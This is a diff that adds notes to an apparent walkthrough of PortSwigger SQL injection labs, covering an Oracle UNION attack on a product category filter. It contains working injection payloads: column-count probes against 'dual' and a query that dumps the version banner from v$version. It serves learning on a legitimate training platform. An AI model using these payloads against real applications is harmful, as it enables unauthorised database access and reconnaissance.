@@ -88,6 +88,20 @@ More info: https://portswigger.net/web-security/sql-injection/examining-the-data
 
 Injection vulnerability in the product category filter, use a UNION to get the database version
 
+Confirm injection and determine how many columns our UNION query needs to return using dummy values and the built-in table `dual`
+
+```sql
+UNION SELECT 'a' FROM dual--
+UNION SELECT 'a', 'b' FROM dual--
+UNION SELECT 'a', 'b', 'c' FROM dual--
+```
+
+Dump the version
+
+```sql
+UNION SELECT BANNER,NULL FROM v$version--
+```
+
 ## SQL injection in different contexts
 
 **Lab: SQL injection with filter bypass via XML encoding**
